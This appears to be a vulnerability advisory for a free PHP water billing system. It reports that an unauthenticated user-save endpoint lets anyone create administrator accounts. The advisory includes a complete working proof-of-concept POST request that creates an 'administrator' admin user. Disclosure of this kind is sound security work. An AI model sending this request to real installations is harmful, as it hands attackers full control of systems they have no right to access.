# Unauthenticated Administrative Account Creation - Water Billing Management System in PHP/OOP Free Source Code

Date: May 8, 2026
Vulnerability Type: Improper Adherence to Privilege Strategy (CWE-269) / Missing Authentication for Critical Function (CWE-306)
Project: Water Billing Management System in PHP/OOP

A critical vulnerability in the Water Billing Management System allows unauthenticated attackers to create new administrative accounts. By sending a specially crafted POST request to the user management endpoint, an attacker can bypass the intended administrative interface and gain full control over the system.

Vulnerability Description
The file /wbms/classes/Users.php contains a function save (triggered by the parameter f=save) that handles the creation and modification of user accounts. This endpoint lacks a session validation check or middleware to verify if the requester has administrative privileges.

Because the system uses an OOP approach where the class method is directly accessible via a GET/POST parameter, an external attacker can invoke the "save" logic without being logged in. By setting the type parameter to 1 (commonly representing the Admin role in this codebase), the attacker can elevate their privileges immediately.

Technical Breakdown
Endpoint: /wbms/classes/Users.php?f=save

Vulnerable Parameter: type=1 (Administrative role assignment)

Impact: Full System Compromise

The following raw HTTP request demonstrates how an attacker can create an administrator account named administrator with the password administrator without any prior authentication:

```POST /wbms/classes/Users.php?f=save HTTP/1.1
Host: localhost
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryGJhiLy3gOi3KH7A3
X-Requested-With: XMLHttpRequest

------WebKitFormBoundaryGJhiLy3gOi3KH7A3
Content-Disposition: form-data; name="id"

------WebKitFormBoundaryGJhiLy3gOi3KH7A3
Content-Disposition: form-data; name="firstname"
administrator
------WebKitFormBoundaryGJhiLy3gOi3KH7A3
Content-Disposition: form-data; name="lastname"
administrator
------WebKitFormBoundaryGJhiLy3gOi3KH7A3
Content-Disposition: form-data; name="username"
administrator
------WebKitFormBoundaryGJhiLy3gOi3KH7A3
Content-Disposition: form-data; name="password"
administrator
------WebKitFormBoundaryGJhiLy3gOi3KH7A3
Content-Disposition: form-data; name="type"
1
------WebKitFormBoundaryGJhiLy3gOi3KH7A3--```
